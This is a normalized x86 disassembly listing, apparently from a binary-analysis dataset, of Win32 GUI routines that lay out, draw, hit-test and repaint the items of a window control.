mov ecx [ eax ]
mov [ esi + 0x40 ] ecx
mov edx [ eax + 0x4 ]
mov [ esi + 0x44 ] edx
mov ecx [ eax + 0x8 ]
mov [ esi + 0x48 ] ecx
mov edx [ eax + 0xc ]
push edi
mov edi [ esi + 0x248 ]
mov [ esi + 0x4c ] edx
lea ecx [ edi + 0xf8 ]
lea edx [ esi + 0x30 ]
lea eax [ ebp - 0x10 ]
call sub_40e630
mov ecx [ eax ]
mov [ esi + 0x24c ] ecx
mov edx [ eax + 0x4 ]
mov [ esi + 0x250 ] edx
mov ecx [ eax + 0x8 ]
mov [ esi + 0x254 ] ecx
mov edx [ eax + 0xc ]
mov [ esi + 0x258 ] edx
lea ecx [ edi + 0x114 ]
lea edx [ esi + 0x30 ]
lea eax [ ebp - 0x10 ]
call sub_40e630
mov ecx [ eax ]
mov [ esi + 0x25c ] ecx
mov edx [ eax + 0x4 ]
mov [ esi + 0x260 ] edx
mov ecx [ eax + 0x8 ]
mov [ esi + 0x264 ] ecx
mov edx [ eax + 0xc ]
pop edi
mov [ esi + 0x268 ] edx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4322a0
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
mov esi ecx
mov eax [ esi + 0x1b0 ]
lea edi [ esi + 0x30 ]
push edi
push eax
call [ GetClientRect@IAT ]
mov ecx [ edi ]
mov edx [ edi + 0x4 ]
mov eax [ edi + 0x8 ]
mov ebx [ esi + 0x248 ]
mov [ esi + 0x50 ] ecx
mov ecx [ edi + 0xc ]
mov [ esi + 0x54 ] edx
mov [ esi + 0x58 ] eax
mov [ esi + 0x5c ] ecx
lea ecx [ ebx + 0xf8 ]
mov edx edi
lea eax [ ebp - 0x10 ]
call sub_40e630
mov edx [ eax ]
mov [ esi + 0x24c ] edx
mov ecx [ eax + 0x4 ]
mov [ esi + 0x250 ] ecx
mov edx [ eax + 0x8 ]
mov [ esi + 0x254 ] edx
mov eax [ eax + 0xc ]
mov [ esi + 0x258 ] eax
lea ecx [ ebx + 0x114 ]
mov edx edi
lea eax [ ebp - 0x10 ]
call sub_40e630
mov ecx [ eax ]
mov [ esi + 0x25c ] ecx
mov edx [ eax + 0x4 ]
mov [ esi + 0x260 ] edx
mov ecx [ eax + 0x8 ]
mov [ esi + 0x264 ] ecx
mov edx [ eax + 0xc ]
pop edi
mov [ esi + 0x268 ] edx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_432360
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push edi
push ebx
mov edi ecx
call sub_42c900
test bl bl
je r-xdata
pop edi
pop ebx
pop ebp
retn 0x4
call sub_432000
sub_432380
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x44
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x40 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi ecx
cmp [ esi - 0x130 ] 0x0
push edi
mov [ esp + 0x24 ] eax
je r-xdata
mov ecx [ esp + 0x4c ]
pop edi
pop esi
pop ebx
xor ecx esp
call sub_443fba
mov esp ebp
pop ebp
retn 0x4
mov ecx [ esi - 0x150 ]
mov eax [ eax + 0x8 ]
mov edx [ ecx + 0xa0 ]
mov eax [ eax ]
push edx
push eax
mov [ esp + 0x30 ] eax
call [ SelectObject@IAT ]
mov eax [ esi + 0xf8 ]
mov edi [ esi + 0x11c ]
mov ecx [ esi + 0xfc ]
mov edx [ esi + 0x100 ]
mov [ esp + 0x10 ] eax
mov eax [ esi + 0x104 ]
mov [ esp + 0x1c ] eax
mov eax [ esi + 0x118 ]
sub edi eax
mov [ esp + 0x14 ] ecx
mov [ esp + 0x18 ] edx
xor ecx ecx
sar edi 0x2
xor edx edx
mov [ esp + 0x20 ] ecx
test edi edi
je r-xdata
mov ebx [ eax + ecx * 4 ]
cmp ebx edx
je r-xdata
mov eax [ esi + 0x118 ]
mov edi [ esi + 0x11c ]
sub edi eax
inc ecx
sar edi 0x2
mov [ esp + 0x20 ] ecx
cmp ecx edi
jb r-xdata
mov ecx [ esp + 0x18 ]
mov eax [ esi + 0xf4 ]
mov eax [ eax + 0x108 ]
mov [ esp + 0x34 ] ecx
mov ecx [ esp + 0x10 ]
lea edi [ eax + ecx ]
cmp eax edx
jne r-xdata
mov eax [ esp + 0x10 ]
mov [ ebx + 0x8 ] eax
mov eax [ esp + 0x14 ]
mov [ ebx + 0xc ] eax
mov eax [ esp + 0x1c ]
mov [ ebx + 0x10 ] edi
mov [ ebx + 0x14 ] eax
mov edx [ esi - 0x154 ]
mov eax [ esp + 0x24 ]
mov edx [ edx + 0xd4 ]
lea ecx [ esi - 0x154 ]
push ebx
push eax
call edx
mov eax [ esi + 0xf4 ]
mov ecx [ eax + 0x10c ]
sub ecx [ esp + 0x10 ]
add ecx edi
add [ esp + 0x10 ] ecx
mov ecx [ esp + 0x20 ]
xor edx edx
mov eax [ esi + 0xf4 ]
add edi [ eax + 0x110 ]
mov eax [ ebx + 0x4 ]
cmp [ eax - 0xc ] edx
je r-xdata
mov ecx [ esi + 0xf4 ]
add edi [ ecx + 0x110 ]
push 0x424
lea ecx [ esp + 0x40 ]
push ecx
push 0xffffffff
mov [ esp + 0x48 ] edx
mov [ esp + 0x4c ] edx
mov [ esp + 0x50 ] edx
mov [ esp + 0x54 ] edx
mov edx [ esp + 0x34 ]
push eax
push edx
call [ DrawTextW@IAT ]
mov eax [ esp + 0x44 ]
sub eax [ esp + 0x3c ]
add edi eax
sub_432510
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
cmp [ eax + 0x24 ] 0x0
je r-xdata
mov edx [ ecx ]
mov edx [ edx + 0xd0 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call edx
pop ebp
retn 0x8
push ebx
mov ebx [ ebp + 0x8 ]
push eax
call sub_432540
pop ebx
pop ebp
retn 0x8
sub_432540
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x2c ] 0x0
push esi
mov esi [ eax + 0x24 ]
je r-xdata
test esi esi
je r-xdata
mov esi [ eax + 0x28 ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_443fba
mov esp ebp
pop ebp
retn 0x4
mov ecx [ eax + 0x8 ]
mov edx [ eax + 0xc ]
mov [ ebp - 0x24 ] ecx
mov ecx [ eax + 0x10 ]
mov [ ebp - 0x20 ] edx
mov edx [ eax + 0x14 ]
mov eax [ eax + 0x18 ]
push edi
xor edi edi
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x18 ] edx
test al 0x1
je r-xdata
test al 0x2
je r-xdata
mov edi 0x2
jmp r-xdata
mov ecx [ esi + 0x14 ]
mov eax [ esi ]
mov edx [ eax + 0xc ]
push ecx
mov ecx esi
call edx
mov eax 0x55555556
imul [ esi + 0xc ]
mov eax edx
shr eax 0x1f
add eax edx
mov edx [ esi + 0x10 ]
mov ecx eax
imul ecx edi
mov [ ebp - 0x14 ] ecx
add ecx eax
mov [ ebp - 0xc ] ecx
push 0x0
mov [ ebp - 0x8 ] edx
lea ecx [ ebp - 0x14 ]
push ecx
lea edx [ ebp - 0x24 ]
mov [ ebp - 0x10 ] 0x0
mov eax [ esi ]
mov eax [ eax + 0x14 ]
push edx
push ebx
mov ecx esi
call eax
pop edi
mov edi 0x1
sub_432600
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x44
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x40 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ecx + 0x4 ]
mov [ esp + 0x28 ] ecx
mov [ esp + 0x14 ] eax
lea ecx [ edi + 0xb0 ]
lea ebx [ esp + 0xc ]
lea eax [ esp + 0x10 ]
mov [ esp + 0xc ] 0x1
call sub_414260
mov eax [ esp + 0x10 ]
xor ebx ebx
cmp eax [ edi + 0xb4 ]
je r-xdata
xor edi edi
mov edi [ eax + 0x10 ]
jmp r-xdata
cmp edi ebx
je r-xdata
mov edi [ esi + 0x28 ]
cmp [ esi + 0x2c ] ebx
je r-xdata
mov ecx [ esp + 0x4c ]
pop edi
pop esi
pop ebx
xor ecx esp
call sub_443fba
mov esp ebp
pop ebp
retn 0x8
mov eax [ esi + 0x18 ]
mov [ esp + 0x3c ] ebx
mov [ esp + 0x40 ] ebx
mov [ esp + 0x44 ] ebx
mov [ esp + 0x48 ] ebx
mov [ esp + 0x2c ] ebx
mov [ esp + 0x30 ] ebx
mov [ esp + 0x34 ] ebx
mov [ esp + 0x38 ] ebx
test al 0x4
je r-xdata
test al 0x1
je r-xdata
mov ebx 0x3
jmp r-xdata
test al 0x8
je r-xdata
mov ebx 0x2
jmp r-xdata
mov edx [ edi ]
mov eax [ edi + 0x14 ]
mov edx [ edx + 0xc ]
push eax
mov ecx edi
call edx
mov eax [ edi + 0xc ]
cdq
and edx 0x3
add eax edx
sar eax 0x2
mov ecx eax
imul ecx ebx
lea edx [ ecx + eax ]
mov eax [ edi + 0x10 ]
mov [ esp + 0x20 ] edx
sub edx ecx
mov [ esp + 0x24 ] eax
mov eax 0x55555556
imul edx
mov eax [ esp + 0x20 ]
mov ebx edx
mov [ esp + 0x3c ] ecx
mov [ esp + 0xc ] ecx
shr ebx 0x1f
add ebx edx
mov [ esp + 0x44 ] eax
mov eax [ esi + 0x8 ]
add ecx ebx
mov [ esp + 0x1c ] 0x0
mov edx [ esp + 0x1c ]
mov [ esp + 0x40 ] edx
mov edx [ esp + 0x24 ]
mov [ esp + 0x44 ] ecx
mov [ esp + 0x10 ] ecx
mov ecx [ esi + 0xc ]
mov [ esp + 0x48 ] edx
mov edx [ esi + 0x10 ]
mov [ esp + 0x2c ] eax
mov [ esp + 0x30 ] ecx
mov ecx [ esi + 0x14 ]
add eax ebx
mov [ esp + 0x34 ] edx
mov [ esp + 0x34 ] eax
push 0x0
mov [ esp + 0x3c ] ecx
mov edx [ edi ]
mov edx [ edx + 0x14 ]
lea eax [ esp + 0x40 ]
push eax
mov eax [ esp + 0x1c ]
lea ecx [ esp + 0x34 ]
push ecx
push eax
mov ecx edi
call edx
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x24 ]
mov edx [ esi + 0x8 ]
mov [ esp + 0x3c ] eax
xor eax eax
mov [ esp + 0x40 ] eax
mov eax [ esp + 0x20 ]
mov [ esp + 0x44 ] eax
sub eax ebx
mov [ esp + 0x3c ] eax
mov eax [ esi + 0xc ]
mov [ esp + 0x30 ] eax
mov eax [ esi + 0x10 ]
mov [ esp + 0x34 ] eax
mov [ esp + 0x48 ] ecx
mov ecx [ esi + 0x14 ]
sub eax ebx
mov [ esp + 0x2c ] edx
mov [ esp + 0x2c ] eax
mov [ esp + 0x38 ] ecx
mov edx [ edi ]
push 0x0
lea eax [ esp + 0x40 ]
push eax
lea ecx [ esp + 0x34 ]
mov eax [ esp + 0x1c ]
mov edx [ edx + 0x14 ]
push ecx
push eax
mov ecx edi
call edx
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x24 ]
mov edx [ esp + 0x10 ]
mov [ esp + 0x3c ] eax
xor eax eax
mov [ esp + 0x48 ] ecx
mov ecx [ esi + 0xc ]
mov [ esp + 0x40 ] eax
mov eax [ esp + 0x20 ]
mov [ esp + 0x30 ] ecx
mov ecx [ esi + 0x10 ]
sub eax ebx
sub ecx ebx
mov [ esp + 0x44 ] eax
mov eax [ esi + 0x8 ]
mov [ esp + 0x3c ] edx
mov edx [ esi + 0x14 ]
mov [ esp + 0x34 ] ecx
add eax ebx
mov ebx [ esp + 0x14 ]
push 0x0
mov [ esp + 0x3c ] edx
lea ecx [ esp + 0x40 ]
push ecx
mov [ esp + 0x34 ] eax
mov eax [ edi ]
mov eax [ eax + 0x18 ]
lea edx [ esp + 0x34 ]
push edx
push ebx
mov ecx edi
call eax
mov edx [ esi + 0x4 ]
cmp [ edx - 0xc ] 0x0
mov ecx [ ebx + 0x8 ]
mov edi [ ecx ]
je r-xdata
test al 0x2
je r-xdata
mov ebx 0x2
jmp r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ esi + 0x10 ]
mov ebx [ esp + 0x28 ]
mov edx [ esi + 0x14 ]
mov [ esp + 0x2c ] eax
mov eax [ esi + 0xc ]
add eax [ ebx + 0x260 ]
mov [ esp + 0x34 ] ecx
mov ecx [ esi + 0x18 ]
mov [ esp + 0x38 ] edx
mov edx [ ebx + 0x248 ]
mov [ esp + 0x30 ] eax
mov eax [ edx + 0x80 ]
test cl 0x1
jne r-xdata
mov ebx 0x1
mov eax [ edx + 0x84 ]
test cl 0x4
je r-xdata
test cl 0x8
je r-xdata
mov eax 0x808080
jmp r-xdata
push eax
push edi
call [ SetTextColor@IAT ]
mov edx [ esi + 0x4 ]
push 0x225
lea ecx [ esp + 0x30 ]
push ecx
push 0xffffffff
push edx
push edi
call [ DrawTextW@IAT ]
mov eax [ edx + 0x88 ]
cmp eax 0xffffffff
jne r-xdata
sub_4328c0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0xc
push ebx
mov ebx ecx
mov eax [ ebx ]
mov edx [ eax + 0x74 ]
push esi
push edi
call edx
test al al
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov edi [ ebp + 0x14 ]
mov eax [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
push edi
push eax
push esi
push ecx
mov ecx ebx
call sub_418fb0
cmp esi 0x5
jne r-xdata
cmp esi 0x2a3
jne r-xdata
mov edx edi
shr edx 0x10
movsx ecx dx
mov edx [ ebx ]
mov edx [ edx + 0xb4 ]
movsx eax di
push ecx
push eax
mov eax [ ebp + 0x10 ]
push eax
mov ecx ebx
call edx
cmp esi 0x20
jne r-xdata
mov esi ebx
call sub_432c10
mov eax 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp esi 0x200
je r-xdata
cmp [ ebx + 0x27 ] 0x0
je r-xdata
mov eax [ ebx + 0x284 ]
test eax eax
je r-xdata
mov edx [ ebx + 0x270 ]
sub edx [ ebx + 0x26c ]
test edx 0xfffffffc
jne r-xdata
cmp esi 0x201
je r-xdata
test [ eax + 0x18 ] 0x2
je r-xdata
mov edx edi
shr edx 0x10
movsx ecx di
movsx edx dx
mov [ esp + 0x10 ] ecx
mov [ esp + 0x14 ] edx
cmp esi 0x200
jne r-xdata
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x8 ]
push edi
push eax
mov edi esi
push ecx
mov esi ebx
call sub_432ee0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp esi 0x202
je r-xdata
mov eax [ ebx + 0x4 ]
mov ecx [ eax + 0x5c ]
push ecx
call [ SetCursor@IAT ]
lea eax [ esi - 0x1f ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov eax [ ebx + 0x284 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x284 ]
test eax eax
je r-xdata
cmp esi 0x203
jne r-xdata
cmp esi 0x200
jne r-xdata
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
push ecx
add eax 0x8
push edx
push eax
call [ PtInRect@IAT ]
test eax eax
je r-xdata
push edx
add eax 0x8
push ecx
push eax
call [ PtInRect@IAT ]
test eax eax
jne r-xdata
xor edi edi
mov [ ebx + 0x284 ] edi
mov ecx [ ebx + 0x270 ]
sub ecx [ ebx + 0x26c ]
sar ecx 0x2
test ecx ecx
je r-xdata
mov eax [ ebx + 0x284 ]
test eax eax
je r-xdata
mov esi [ ebx + 0x284 ]
jmp r-xdata
mov eax [ ebx + 0x284 ]
and [ eax + 0x18 ] 0xfffffffd
mov eax [ ebx + 0x284 ]
and [ eax + 0x18 ] 0xfffffff7
mov edx [ ebx + 0x284 ]
lea esi [ ebx + 0x154 ]
add edx 0x8
mov eax esi
call sub_41afb0
mov ecx [ ebx + 0x284 ]
mov eax [ ebx ]
mov edx [ ebx + 0x18c ]
mov eax [ eax + 0xd4 ]
push ecx
push edx
mov ecx ebx
call eax
mov eax [ ebx + 0x284 ]
add eax 0x8
call sub_41af80
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x14 ]
lea esp [ esp ]
and [ eax + 0x18 ] 0xfffffffd
mov edx [ ebx + 0x284 ]
lea esi [ ebx + 0x154 ]
add edx 0x8
mov eax esi
call sub_41afb0
mov ecx [ ebx + 0x284 ]
mov eax [ ebx ]
mov edx [ ebx + 0x18c ]
mov eax [ eax + 0xd4 ]
push ecx
push edx
mov ecx ebx
call eax
mov eax [ ebx + 0x284 ]
add eax 0x8
call sub_41af80
test esi esi
je r-xdata
mov eax [ ebx + 0x270 ]
sub eax [ ebx + 0x26c ]
inc edi
sar eax 0x2
cmp edi eax
jb r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x10 ]
push eax
push ecx
lea edx [ esi + 0x8 ]
push edx
call [ PtInRect@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0xc ]
push ecx
push edx
mov esi ebx
call sub_432ee0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov eax [ esi + 0x18 ]
test al 0x4
jne r-xdata
mov edx [ ebx + 0x26c ]
mov esi [ edx + edi * 4 ]
test esi esi
je r-xdata
mov edi [ ebp + 0x14 ]
mov [ ebx + 0x284 ] esi
mov ecx [ ebp + 0xc ]
sub ecx 0x200
je r-xdata
test al 0x2
jne r-xdata
dec ecx
je r-xdata
or eax 0x2
mov [ esi + 0x18 ] eax
lea eax [ ebx + 0x154 ]
lea edx [ esi + 0x8 ]
mov [ esp + 0x10 ] eax
call sub_41afb0
mov eax [ ebx ]
mov ecx [ ebx + 0x18c ]
mov edx [ eax + 0xd4 ]
push esi
push ecx
test al 0x8
jne r-xdata
dec ecx
jne r-xdata
or eax 0x8
mov [ esi + 0x18 ] eax
lea eax [ ebx + 0x154 ]
lea edx [ esi + 0x8 ]
mov [ esp + 0x10 ] eax
call sub_41afb0
mov edx [ ebx ]
mov eax [ ebx + 0x18c ]
mov edx [ edx + 0xd4 ]
push esi
push eax
jmp r-xdata
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ ebx ]
mov eax [ eax + 0xd8 ]
push ecx
push edx
push esi
mov ecx ebx
call eax
xor eax eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov ecx ebx
call edx
lea eax [ esi + 0x8 ]
mov esi [ esp + 0x10 ]
call sub_41af80
sub_432c10
push ebp
mov ebp esp
push ecx
xor eax eax
mov [ esi + 0x284 ] eax
mov ecx [ esi + 0x270 ]
sub ecx [ esi + 0x26c ]
mov [ ebp - 0x4 ] eax
sar ecx 0x2
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn
push ebx
push edi
jmp r-xdata
mov edx [ esi + 0x26c ]
mov ebx [ edx + eax * 4 ]
test ebx ebx
je r-xdata
mov edx [ esi + 0x270 ]
sub edx [ esi + 0x26c ]
mov eax [ ebp - 0x4 ]
inc eax
sar edx 0x2
mov [ ebp - 0x4 ] eax
cmp eax edx
jb r-xdata
mov eax [ ebx + 0x18 ]
test al 0xa
je r-xdata
pop edi
pop ebx
and eax 0xfffffff5
mov [ ebx + 0x18 ] eax
cmp [ esi + 0x158 ] 0x0
lea edi [ ebx + 0x8 ]
je r-xdata
mov edx [ esi ]
mov eax [ esi + 0x18c ]
mov edx [ edx + 0xd4 ]
push ebx
push eax
mov ecx esi
call edx
cmp [ esi + 0x158 ] 0x0
je r-xdata
cmp [ esi + 0x1a0 ] 0x0
je r-xdata
cmp [ esi + 0x1a0 ] 0x0
je r-xdata
cmp [ esi + 0x18c ] 0x0
je r-xdata
mov eax [ esi + 0x15c ]
push 0x0
push edi
push eax
call [ InvalidateRect@IAT ]
mov ecx [ esi + 0x15c ]
push ecx
call [ UpdateWindow@IAT ]
mov eax [ edi + 0x4 ]
mov ecx [ edi ]
mov edx [ esi + 0x190 ]
mov edx [ edx + 0x8 ]
mov edx [ edx ]
push 0xcc0020
push eax
push ecx
push edx
mov edx [ edi + 0xc ]
sub edx eax
push edx
mov edx [ edi + 0x8 ]
sub edx ecx
push edx
push eax
mov eax [ esi + 0x18c ]
mov eax [ eax + 0x8 ]
push ecx
mov ecx [ eax ]
push ecx
call [ BitBlt@IAT ]
sub_432d20
push ebp
mov ebp esp
sub esp 0x8
push ebx
mov ebx [ ebp + 0x8 ]
mov eax [ ebx + 0x18 ]
push esi
mov esi ecx
test al 0x1
jne r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
test al 0x8
je r-xdata
mov ecx [ esi + 0x270 ]
sub ecx [ esi + 0x26c ]
xor eax eax
sar ecx 0x2
push edi
mov [ ebp - 0x4 ] eax
test ecx ecx
je r-xdata
or [ ebx + 0x18 ] 0x1
mov edx [ ebx + 0x1c ]
mov [ esi + 0x280 ] edx
mov eax [ ebx + 0x18 ]
test al 0x1
je r-xdata
lea ecx [ ecx ]
pop edi
and eax 0xfffffff7
mov [ ebx + 0x18 ] eax
cmp [ esi + 0x158 ] 0x0
lea edi [ ebx + 0x8 ]
je r-xdata
mov ecx [ esi + 0x270 ]
sub ecx [ esi + 0x26c ]
mov eax [ ebp - 0x4 ]
inc eax
sar ecx 0x2
mov [ ebp - 0x4 ] eax
cmp eax ecx
jb r-xdata
mov eax [ edi + 0x20 ]
cmp eax [ ebx + 0x20 ]
je r-xdata
mov edx [ esi ]
mov eax [ esi + 0x18c ]
mov edx [ edx + 0xd4 ]
push ebx
push eax
mov ecx esi
call edx
cmp [ esi + 0x158 ] 0x0
je r-xdata
cmp [ esi + 0x1a0 ] 0x0
je r-xdata
mov edx [ esi + 0x26c ]
mov edi [ edx + eax * 4 ]
test edi edi
je r-xdata
mov eax [ edi + 0x18 ]
test al 0x9
je r-xdata
mov ecx [ esi + 0x1c ]
test ecx ecx
je r-xdata
cmp [ esi + 0x1a0 ] 0x0
je r-xdata
cmp [ esi + 0x18c ] 0x0
je r-xdata
and eax 0xfffffff6
mov [ edi + 0x18 ] eax
lea edx [ edi + 0x8 ]
lea eax [ esi + 0x154 ]
mov [ ebp - 0x8 ] edx
call sub_41afb0
mov edx [ esi ]
mov eax [ esi + 0x18c ]
mov edx [ edx + 0xd4 ]
push edi
push eax
mov ecx esi
call edx
cmp [ esi + 0x158 ] 0x0
je r-xdata
mov eax [ ebx + 0x20 ]
mov edx [ ecx ]
mov edx [ edx + 0x10 ]
push eax
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x4 ]
push eax
push 0x111
push esi
call edx
mov eax [ esi + 0x15c ]
push 0x0
push edi
push eax
call [ InvalidateRect@IAT ]
mov ecx [ esi + 0x15c ]
push ecx
call [ UpdateWindow@IAT ]
mov eax [ edi + 0x4 ]
mov ecx [ edi ]
mov edx [ esi + 0x190 ]
mov edx [ edx + 0x8 ]
mov edx [ edx ]
push 0xcc0020
push eax
push ecx
push edx
mov edx [ edi + 0xc ]
sub edx eax
push edx
mov edx [ edi + 0x8 ]
sub edx ecx
push edx
push eax
mov eax [ esi + 0x18c ]
mov eax [ eax + 0x8 ]
push ecx
mov ecx [ eax ]
push ecx
call [ BitBlt@IAT ]
mov ebx [ ebp + 0x8 ]
cmp [ esi + 0x1a0 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ esi + 0x15c ]
push 0x0
push eax
push ecx
call [ InvalidateRect@IAT ]
mov edx [ esi + 0x15c ]
push edx
call [ UpdateWindow@IAT ]
sub_432ee0
push ebp
mov ebp esp
push ecx
lea eax [ edi - 0x200 ]
cmp eax 0xe
ja r-xdata
xor eax eax
mov esp ebp
pop ebp
retn 0xc
mov eax [ esi + 0x18 ]
test eax eax
je r-xdata
cmp [ eax + 0x10 ] 0x2
jne r-xdata
mov ecx eax
mov edx [ ecx ]
mov eax [ edx + 0x58 ]
call eax
test eax eax
je r-xdata
mov edx [ eax ]
mov edx [ edx + 0x1c ]
lea ecx [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push edi
push ecx
push esi
mov ecx eax
mov [ ebp - 0x1 ] 0x0
call edx
sub_432f70
push ebp
mov ebp esp
push 0xffffffff
push sub_44a548
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
push esi
call sub_431c70
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov [ esi + 0x154 ] r--data
mov [ esi + 0x1a4 ] r--data
mov [ esi + 0x1ac ] r--data
mov [ esi + 0x1d4 ] r--data
mov [ esi + 0x298 ] eax
mov [ esi + 0x29c ] eax
mov [ esi + 0x2a0 ] eax
mov [ esi + 0x2a4 ] eax
mov [ esi + 0x2a8 ] eax
mov [ esi + 0x2ac ] eax
mov [ esi + 0x2b0 ] eax
mov [ esi + 0x2b4 ] eax
mov [ esi + 0xc ] 0x1e
mov [ esi + 0x10 ] 0x1b
mov [ esi + 0x220 ] r--data
mov [ esi + 0x294 ] al
mov [ esi + 0x2b8 ] al
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_433050
push ebp
mov ebp esp
push 0xffffffff
push sub_44a518
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov [ esi + 0x154 ] r--data
mov [ esi + 0x1a4 ] r--data
mov [ esi + 0x1ac ] r--data
mov [ esi + 0x1d4 ] r--data
mov [ ebp - 0x4 ] 0xffffffff
call sub_431da0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_4330e0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x3c
push ebx
push esi
push edi
mov edi ecx
cmp [ edi - 0x130 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ edi - 0x150 ]
mov ecx [ eax + 0xa0 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
push ecx
mov ecx [ eax ]
push ecx
call [ SelectObject@IAT ]
mov eax [ edi + 0x11c ]
sub eax [ edi + 0x118 ]
sar eax 0x2
mov [ esp + 0x10 ] eax
test eax eax
jle r-xdata
mov edx [ edi + 0xf8 ]
mov ecx [ edi + 0xfc ]
mov [ esp + 0x18 ] edx
mov edx [ edi + 0x100 ]
dec eax
mov [ esp + 0x20 ] edx
mov edx [ edi + 0xf4 ]
imul eax [ edx + 0x10c ]
mov [ esp + 0x1c ] ecx
mov ecx [ edi + 0x104 ]
mov [ esp + 0x24 ] ecx
mov ecx [ edi + 0x100 ]
sub ecx eax
sub ecx [ edi + 0xf8 ]
mov [ esp + 0x14 ] ecx
fild [ esp + 0x14 ]
fidiv [ esp + 0x10 ]
fstp [ esp + 0x14 ]
fld [ r--data ]
fld [ esp + 0x14 ]
fcom st1
fnstsw ax
test ah 0x1
jne r-xdata
fstp st1
fcom [ r--data ]
fnstsw ax
test ah 0x1
je r-xdata
fstp st0
jmp r-xdata
mov edx [ edi + 0x11c ]
fstp [ esp + 0x10 ]
sub edx [ edi + 0x118 ]
xor eax eax
sar edx 0x2
mov [ esp + 0x14 ] eax
test edx edx
je r-xdata
fstp st0
mov [ edi + 0x164 ] 0x1
fld [ r--data ]
mov [ edi + 0x164 ] 0x0
mov ecx [ edi + 0x118 ]
mov esi [ ecx + eax * 4 ]
test esi esi
je r-xdata
mov ecx [ edi + 0x11c ]
sub ecx [ edi + 0x118 ]
inc eax
sar ecx 0x2
mov [ esp + 0x14 ] eax
cmp eax ecx
jb r-xdata
fild [ esp + 0x18 ]
mov edx [ esp + 0x20 ]
mov [ esp + 0x40 ] edx
fadd [ esp + 0x10 ]
call sub_4449b0
mov ebx eax
cmp ebx [ edi + 0x100 ]
jg r-xdata
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x24 ]
mov [ esi + 0x8 ] eax
mov eax [ esp + 0x1c ]
mov [ esi + 0xc ] eax
add eax 0xb
lea edx [ ecx - 0xe ]
mov [ esi + 0x10 ] ebx
mov [ esi + 0x14 ] ecx
mov ecx [ edi + 0xf4 ]
mov [ esp + 0x2c ] eax
mov eax ebx
sub eax [ ecx + 0x110 ]
mov [ esp + 0x34 ] edx
mov ecx eax
sub ecx edx
mov edx [ esp + 0x2c ]
add ecx edx
mov [ esi + 0x34 ] ecx
mov [ esi + 0x38 ] edx
mov edx [ esp + 0x34 ]
mov [ esi + 0x3c ] eax
mov [ esi + 0x40 ] edx
mov eax [ edi - 0x154 ]
mov edx [ ebp + 0x8 ]
mov eax [ eax + 0xd4 ]
lea ecx [ edi - 0x154 ]
push esi
push edx
call eax
mov ecx [ edi + 0xf4 ]
mov edx [ ecx + 0x10c ]
sub edx [ esp + 0x18 ]
